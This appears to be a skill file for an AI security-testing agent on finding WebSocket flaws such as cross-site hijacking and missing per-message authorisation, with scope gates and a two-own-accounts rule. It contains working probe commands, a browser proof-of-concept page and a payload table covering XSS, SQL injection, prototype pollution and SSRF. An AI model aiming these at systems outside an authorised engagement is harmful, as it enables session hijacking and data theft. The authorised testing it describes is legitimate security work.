---
name: zp-websocket
description: ZeroProtocol hunter for WebSocket security - Cross-Site WebSocket Hijacking, handshake Origin validation, authentication applied at the upgrade but never per message, message-level injection, subprotocol negotiation and upgrade tunnelling. Use when a 101 Switching Protocols appears, when JavaScript calls new WebSocket or socket.io, when testing a chat, live dashboard, notification or trading channel, or when a ws or wss endpoint carries authenticated data. A 101 from a foreign origin is a candidate, never a finding on its own.
---

# zp-websocket - the channel nobody re-checks

**Phase:** 5 | **Gate:** **active.** `zp-scope check <target>` must exit 0 before any request.
Exit 1 refuse and name the pattern · 3 stop · 4 stop.

A WebSocket is authorised once, at the handshake, and then trusted for its whole lifetime. Every
bug in this class lives in that gap: the handshake accepts an origin it should not (CSWSH), or it
accepts you correctly and then never re-checks what you send. **The bar: a `101 Switching
Protocols` is not a finding.** The finding is authenticated *data* crossing a boundary, or a
privileged frame producing a real server-side effect.

**ZeroProtocol stops at proof here:** read your own second account's stream, with a marker you
planted. Never another user's. No message floods, no oversized or malformed frames, no ARP or
on-path interception of `ws://`, no privileged write that moves money or touches data you do not own.

---

## Procedure

**1. Find the endpoints.** They are almost never in the sitemap.

```bash
grep -rhoE "new WebSocket\(['\"][^'\"]+|io\((['\"][^'\"]*)?|wss?://[^'\"]+|/socket\.io|/signalr|/cable\b|new SockJS" \
  loot/js/ 2>/dev/null | sort -u
grep -iE 'socket|websocket|/ws\b|realtime|live|stream|notifications|/cable|/signalr' surface/urls.txt | sort -u
```

```bash
# socket.io / Engine.IO leak their version and a fresh sid over plain HTTP polling
curl -sk --max-time 15 "https://$H/socket.io/?EIO=4&transport=polling" | head -c 300; echo
```

**2. Probe the upgrade by hand.** Any curl can do this over `https://`; you are reading the 101,
not speaking the framed protocol.

```bash
KEY=$(head -c16 /dev/urandom | base64)
curl -skI --max-time 15 "https://$H/ws" \
  -H 'Connection: Upgrade' -H 'Upgrade: websocket' -H 'Sec-WebSocket-Version: 13' \
  -H "Sec-WebSocket-Key: $KEY" | head -20
```

No curl? `openssl s_client` speaks it directly:

```bash
printf 'GET /ws HTTP/1.1\r\nHost: %s\r\nUpgrade: websocket\r\nConnection: Upgrade\r\n'\
'Sec-WebSocket-Version: 13\r\nSec-WebSocket-Key: %s\r\nOrigin: https://evil.tld\r\n\r\n' "$H" "$KEY" \
  | openssl s_client -quiet -connect "$H:443" -servername "$H" 2>/dev/null | head -20
```

Verify the server actually computed `Sec-WebSocket-Accept` rather than echoing something - a client
that skips this check is itself a MITM bug (see the curl cases below):

```bash
python3 -c "import sys,base64,hashlib;k=sys.argv[1];print(base64.b64encode(hashlib.sha1((k+'258EAFA5-E914-47DA-95CA-5AB0DC85B11F').encode()).digest()).decode())" "$KEY"
```

**3. Establish the auth model before testing anything.** CSWSH needs **all three** conditions.
Check them in this order and you will kill most candidates in two minutes.

| Condition | How to read it | If absent |
|---|---|---|
| handshake authenticates by an **ambient** credential (cookie sent by the browser) | DevTools -> Network -> WS -> Headers, or your captured handshake | token-authenticated - CSWSH dead cross-site |
| **no unpredictable per-connection value** in the handshake | no `?token=`, no nonce in the path, no bearer in `Sec-WebSocket-Protocol`, no auth in the first app frame | attacker cannot forge it - dead |
| the session cookie is reachable cross-site | `curl -skI "https://$H/" \| grep -io 'samesite=[a-z]*'` | `SameSite=Lax` or `Strict` are **not** sent on a WebSocket upgrade - dead in a modern browser |

`SameSite` is the modern killer of this class. A cookie with no `SameSite` attribute defaults to
`Lax` in current Chrome and Firefox, so a bare "no Origin check" report is usually not exploitable
today. Confirm `SameSite=None` (or an old-browser-only claim you state as such) before you write.

**4. Probe Origin enforcement.** Real clients, one variable at a time.

```bash
for o in https://evil.tld null "http://$H" "https://$H.evil.tld" "https://evil$H" "https://$H-evil.tld"; do
  printf '%-32s ' "$o"
  websocat -k -n --origin "$o" -H "Cookie: session=$TOK_A" "wss://$H/ws" </dev/null 2>&1 | head -2 | tr '\n' ' '
  echo
done
```

`wscat` is the same probe with different flags (`-c` url, `-o` origin, `-H` header, `-n` skip cert
check, `-x` send one message then exit, `-w` seconds to wait):

```bash
wscat -c "wss://$H/ws" -o https://evil.tld -H "Cookie: session=$TOK_A" -x '{"type":"ping"}' -w 5
```

Python `websockets` when you need logic rather than a shell loop. **The keyword changed name:**
`additional_headers=` on websockets >= 14, `extra_headers=` before it. Pass both nothing and guess
nothing - check `pip show websockets` first.

```python
import asyncio, websockets                      # pip install websockets
async def probe(origin):
    try:
        async with websockets.connect("wss://HOST/ws", origin=origin,
                                      additional_headers={"Cookie": "session=TOK_A"}) as ws:
            await ws.send('{"type":"subscribe","channel":"user_notifications"}')
            print(origin, "->", (await asyncio.wait_for(ws.recv(), 5))[:200])
    except Exception as e:
        print(origin, "-> rejected", type(e).__name__, e)
asyncio.run(probe("https://evil.tld"))
```

**5. Prove CSWSH in a browser, with two accounts.** This is the only proof triage accepts, because
cross-origin JavaScript cannot set `Origin` or `Cookie` - the browser does, which *is* the threat
model. Drive it with `zp-browser`.

```html
<!-- served from YOUR origin; account B (the "victim", also yours) logged into the target -->
<!DOCTYPE html><meta charset="utf-8"><pre id="o"></pre>
<script>
const ws = new WebSocket("wss://TARGET/ws");
const log = s => document.getElementById("o").textContent += s + "\n";
ws.onopen = () => { log("open from " + location.origin);
                    ws.send(JSON.stringify({type:"subscribe",channel:"user_notifications"})); };
ws.onmessage = e => log("RECEIVED: " + e.data);     // must contain account B's planted marker
ws.onerror   = () => log("rejected at the message layer");
</script>
```

Plant a unique string in account B (a display name, a note, a message body) and require it in the
received frames. `agent-browser --session zp-ws network requests` records the receipt out of band.

**6. Per-message authorisation - the half of the class everyone skips.** Authenticate the socket
normally, then send frames you should not be allowed to send.

```bash
websocat -k -t -n "wss://$H/ws" <<'EOF'
{"action":"getProfile","userId":1}
{"action":"getSecretConfig"}
{"action":"subscribe","channel":"admin_events"}
EOF
```

Run the same script three ways - no cookie, low-privilege cookie, your own cookie with another
account's id - and diff the responses. An accepted-and-silently-ignored frame is **not** a finding;
confirm the effect through a second channel (the REST API, a fresh socket, the UI).

**7. Message-level injection reaches the same sinks as HTTP.** The WebSocket path usually has no
WAF and often no validation, because the developer assumed only their own client speaks it. Send
the payloads you would send over HTTP, then look for the result elsewhere.

**8. Subprotocol, token placement and transport.**

```bash
websocat -k -n --protocol "chat, bearer.$TOK_A" "wss://$H/ws" </dev/null 2>&1 | head -3
curl -skI "https://$H/ws" -H 'Connection: Upgrade' -H 'Upgrade: websocket' \
  -H 'Sec-WebSocket-Version: 13' -H "Sec-WebSocket-Key: $KEY" -H 'Sec-WebSocket-Protocol: admin, chat' \
  | grep -i 'sec-websocket-protocol'
```

A server that echoes a subprotocol it was never offered, or accepts `admin` from an unprivileged
session, is doing negotiation by string match. A token in the URL (`wss://$H/ws?access_token=…`)
lands in proxy logs, `Referer` and browser history - report it as the info-disclosure it is, not as
ATO.

**9. Tunnelling lives at the handshake, not in the frames.** Once a socket is open your bytes are
wrapped in WebSocket frames and are **never re-parsed as HTTP** by the proxy - typing
`GET /admin HTTP/1.1` into `wscat` does nothing. The real technique is a handshake the front proxy
and the origin disagree about (for example `Sec-WebSocket-Version: 777`, or `Upgrade: websocket`
with `Connection: keep-alive`), after which the proxy tunnels raw bytes to a backend that is still
speaking HTTP. That is a desync: take it to `zp-smuggling` and prove it the way smuggling is proven.

**10. Rate limiting, bounded.** Send a **short, counted burst** - 20 frames, once - and record
whether any throttle, close or error appears. Then stop. Do not sustain it, do not parallelise it,
and never pair it with credential or OTP values. A missing limit is reported as a missing control
with that bounded evidence; it is not a licence to run the attack it enables.

---

## Probes and payloads

| Probe | Sent as | A positive looks like |
|---|---|---|
| `Origin: https://evil.tld` | handshake header | `101` **and** authenticated frames still flow |
| `Origin: null` | handshake header | `101` - reachable from a sandboxed iframe or `data:` URL |
| `Origin: https://$H.evil.tld` / `https://evil$H` | handshake header | `101` - the allow-list is an unanchored substring match |
| no `Origin` at all | handshake | `101` from a non-browser client; browsers always send one, so this alone is weak |
| `{"userId":1}` / `{"id":"<other account>"}` | app frame | another account's data returns -> `zp-idor` |
| `{"action":"deleteUser"}`, `{"action":"getSecretConfig"}` | app frame, low-priv session | the effect is visible on a second channel |
| `{"price":0.01}`, `{"amount":999999}`, `{"role":"admin"}` | app frame | the value **persists** server-side, not just echoes back |
| `<img src=x onerror="document.title='zp-91234'">` | chat / comment frame | renders for a second client -> stored XSS, `zp-xss` |
| `' OR 1=1--`, `{"$ne":null}`, `{"id":"1' AND SLEEP(5)--"}` | app frame | timing or error differential -> `zp-sqli` |
| `{"__proto__":{"zpcanary":"91234"}}` | JSON frame | canary appears in a later response -> `zp-proto-pollution` |
| `{"url":"http://<collector>/zp"}` | app frame naming a resource | the collector is hit from the server -> `zp-ssrf` |
| `40/admin,` after the Engine.IO `0{...}` open | socket.io CONNECT packet | `40/admin,{"sid":…}` ack, then `42` event frames with another tenant's data |
| `42/admin,["join",{"room":"user_999"}]` | socket.io EVENT | `42` frames for a room you were never granted |
| `?sid=<another sid>` on `transport=polling` | HTTP | a `200` resuming someone else's stream (`400 Session ID unknown` is correct) |
| `Sec-WebSocket-Version: 777` | handshake | proxy tunnels while the origin refuses -> `zp-smuggling` |

**socket.io namespace trap:** `&nsp=/admin` is **not** a recognised query parameter. It is silently
ignored, you connect to the root namespace, and you will believe you tested `/admin` when you did
not. Namespace selection is the protocol packet `40/admin,` (`4` Engine.IO MESSAGE, `0` socket.io
CONNECT) sent on the open socket. `42` is MESSAGE+EVENT, not CONNECT.

---

## Confirm or kill

| Evidence | Verdict |
|---|---|
| attacker-origin page receives account B's planted marker | **confirmed CSWSH.** High |
| the hijacked stream carries a session, refresh or CSRF token | **Critical** - account takeover, chain to `zp-jwt-oauth` |
| `101` returned for `Origin: https://evil.tld` | **candidate only.** The server may still refuse at the message layer. Not reportable |
| `101` from a foreign origin, but the cookie is `SameSite=Lax`/`Strict` | not exploitable in a current browser. Killed, or filed as hardening at best |
| `101` from a foreign origin, but a per-connection token rides the handshake | attacker cannot forge it. Killed |
| the socket is unauthenticated **and** only serves public data | working as designed. Killed |
| a privileged frame is accepted but nothing changes | **killed.** Acceptance is not effect - prove it on a second channel |
| your own frame echoed back to you | killed. Optimistic UI echo, not server state |
| `40/admin,` ack with no subsequent data | connected to an empty namespace. Not a finding |
| tampered price or amount visible only in your own UI | killed until the order or balance API confirms it |
| injection payload stored and rendered for another client | **confirmed stored XSS**, severity from the sink -> `zp-xss` |
| `ws://` in production carrying authenticated data | real but Medium at best, and only with a plausible on-path story. Do **not** demonstrate interception |
| no rate limit on messages | a missing control. Only rises above Low when it enables a named attack - and you stop before running it |
| a malformed frame crashed the server | **you caused an outage.** Stop, disclose it immediately, do not repeat it |

---

## High-value patterns

- **Collaboration and chat apps** - the socket is authenticated purely by cookie because the developer never expected another origin to open it. This is where CSWSH actually lives.
- **A stream that replays history on subscribe** - one hijacked connection hands over the whole conversation, not just what arrives next.
- **A frame carrying an XSRF or refresh token** to bootstrap the client. CSWSH plus that frame is ATO.
- **Live dashboards and notification feeds** - the subscribe message takes an id and nobody checks it belongs to you (`zp-idor`).
- **Trading, checkout and game sockets** where price or quantity comes from the client.
- **GraphQL over `graphql-transport-ws`** - introspection and queries often work unauthenticated on the socket while the HTTP endpoint is locked down (`zp-graphql`).
- **socket.io behind an authenticated HTTP app** - namespaces and rooms are a second authorisation surface, frequently unimplemented.
- **`ws://127.0.0.1:<port>` opened by a desktop app** - any web page can reach it, and these speak JSON-RPC with real local capability. High impact, rarely in scope; check the program first.

Disclosed cases worth reading before you write - they calibrate what gets paid and what does not:

| Report | Class | Lesson |
|---|---|---|
| [535436](https://hackerone.com/reports/535436) Superhuman, $800 | CSWSH, no Origin check | the canonical accepted CSWSH, proven by receiving victim data |
| [201326](https://hackerone.com/reports/201326) Uber / Mattermost, $2000 | CSWSH | missing Origin check on an internal chat = critical information leakage |
| [915541](https://hackerone.com/reports/915541) Stripo | CSWSH -> token theft | the stream leaked `XSRF-TOKEN`, which is what made it severe |
| [931197](https://hackerone.com/reports/931197) socket.io | CSWSH in the library | the framework default, not the app, was the bug |
| [2541027](https://hackerone.com/reports/2541027) Mattermost, $150 | message injection | frames sent over the socket were not sanitised like HTTP input |
| [1023669](https://hackerone.com/reports/1023669) Shopify | per-message authz | staff with no permissions subscribed to other WebSocket events |
| [2209750](https://hackerone.com/reports/2209750) Bykea | over-broad frames | the socket returned fields the client never needed |
| [862835](https://hackerone.com/reports/862835) Nuri | GraphQL over WS | introspection worked unauthenticated on the socket only |
| [3917775](https://hackerone.com/reports/3917775) / [3474865](https://hackerone.com/reports/3474865) curl | client-side | accepting any `Sec-WebSocket-Accept` enables session hijacking - check the client too |

---

## Pitfalls

- **Reporting a `101` from `Origin: https://evil.tld`.** The single most common junk WebSocket report. It proves the upgrade opened, nothing more.
- **Ignoring `SameSite`.** Most "missing Origin validation" findings are not exploitable in a 2026 browser. Check the cookie first, and say so in the report.
- **Proving CSWSH with `wscat` or `curl`.** A CLI client sets whatever headers you tell it to; a browser is the only witness that matters.
- **Reading a real user's stream.** Two accounts, both yours, one planted marker. Always.
- **Treating "frame accepted" as impact.** Confirm the effect on a second channel.
- **Confusing an optimistic UI echo with server state.**
- **Typing HTTP into an open socket** and calling it smuggling. Frames are not re-parsed; the bug is at the handshake.
- **Using `&nsp=/admin`** and believing you tested the admin namespace.
- **Guessing the `websockets` keyword** (`extra_headers` vs `additional_headers`) and reading a `TypeError` as a rejection.
- **Message flooding, oversized frames or huge declared payload lengths.** That is a DoS against a live service and it will end the engagement.
- **Demonstrating `ws://` interception.** On-path attacks touch other users' traffic - out of scope everywhere. Report the transport, do not exploit it.
- **Leaving sockets open.** Every idle connection is a server-side resource; close them.
- **Testing a localhost socket you found in a desktop app** without checking it is in the program's scope.

---

## Hand off to

Confirmed CSWSH -> `zp-triage`, `zp-report` with the browser recording. Browser proof -> `zp-browser`.
Token in the hijacked stream -> `zp-jwt-oauth`. Per-message authz and cross-account ids -> `zp-authz`,
`zp-idor`. Injection sinks -> `zp-xss`, `zp-sqli`, `zp-rce-ssti`, `zp-proto-pollution`, `zp-ssrf`.
Handshake desync -> `zp-smuggling`. Same backend over HTTP -> `zp-api`, `zp-graphql`.
Cookie and origin policy -> `zp-cors`. Endpoints found in bundles -> `zp-js-secrets`.
Frame capture and replay -> `zp-proxy`. Parallel-connection state bugs -> `zp-race`.

Class reference cross-checked against `usestrix/strix` (Apache-2.0) `csrf` and `browser_security`.
